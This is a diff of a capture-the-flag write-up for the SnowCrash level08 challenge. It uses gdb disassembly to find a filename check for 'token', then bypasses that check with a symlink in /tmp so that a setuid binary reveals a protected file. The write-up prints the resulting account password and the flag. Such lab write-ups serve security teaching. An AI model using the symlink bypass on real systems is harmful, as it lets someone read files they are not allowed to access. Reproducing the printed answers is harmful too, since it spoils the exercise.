@@ -1,8 +1,48 @@
-We disassemble the level08 binary and notice that it reads the file passed as argument to the program
-if the don't contain "token" in their name
+We find a binary file named level08 and a file named token in the home directory of level08 user.
 
-We create a symbolic link in temp that links to /home/user/level08/token then execute the binary with this file
-as the argument, and we get the password of the flag08 account then we get the flag
+level08@SnowCrash:~$ ls -lah
+-rwsr-s---+ 1 flag08  level08 8.5K Mar  5  2016 level08
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+We disassemble the level08 binary using gdb and discover that the program checks if the file passed as an argument contains the string "token".
+
+The disassembly output shows the strstr function:
+
+(gdb) set disassembly-flavor intel
+(gdb) disass main
+...
+0x080485a6 <+82>:	mov    eax,DWORD PTR [esp+0x1c]
+0x080485aa <+86>:	add    eax,0x4
+0x080485ad <+89>:	mov    eax,DWORD PTR [eax]
+0x080485af <+91>:	mov    DWORD PTR [esp+0x4],0x8048793
+0x080485b7 <+99>:	mov    DWORD PTR [esp],eax
+0x080485ba <+102>:	call   0x8048400 <strstr@plt>
+0x080485bf <+107>:	test   eax,eax
+0x080485c1 <+109>:	je     0x80485e9 <main+149>
+...
+
+We examine the string stored at the memory location 0x8048793, and it confirms the check for the "token" string:
+
+(gdb) x/s 0x8048793
+0x8048793:	 "token"
+
+Next, we create a symbolic link in /tmp pointing to /home/user/level08/token:
 
 ln -s /home/user/level08/token /tmp/t0k3n
+
+Then, we execute the binary with the symbolic link as an argument:
+
 ./level08 /tmp/t0k3n
+
+This returns the password for the flag08 user:
+
+quif5eloekouj29ke0vouxean
+
+We use su to switch to the flag08 user:
+
+su flag08
+
+After entering the password, we can run getflag to obtain the flag:
+
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
